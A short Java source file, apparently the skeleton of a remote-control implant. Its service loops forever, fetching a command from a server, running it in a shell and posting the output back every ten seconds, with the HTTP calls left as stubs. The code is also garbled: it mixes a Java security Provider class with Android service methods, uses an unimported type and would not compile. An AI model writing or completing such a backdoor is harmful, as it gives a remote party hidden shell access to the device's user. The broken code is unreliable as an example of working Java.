package src.main.java.com.agent.services;
import java.security.Provider;
import java.security.Provider.Service;
import java.util.List;
import java.util.Map;

import src.main.java.com.agent.util.ShellExecutor;

public class CommandService extends Service {
    public CommandService(Provider provider, String type, String algorithm, String className, List<String> aliases,
            Map<String, String> attributes) {
        super(provider, type, algorithm, className, aliases, attributes);
        //TODO Auto-generated constructor stub
    }

    private static final int START_STICKY = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true) {
                String cmd = fetchCommand();
                String output = ShellExecutor.execute(cmd);
                postOutput(output);
                Thread.sleep(10000);
            }
        }).start();
        return START_STICKY;
    }

    private String fetchCommand() {
        return null;
        // Make HTTP GET request to server
        // return "id" or payload command
    }

    private void postOutput(String output) {
        // POST /post_output to server
    }

    // Boilerplate onBind()
}
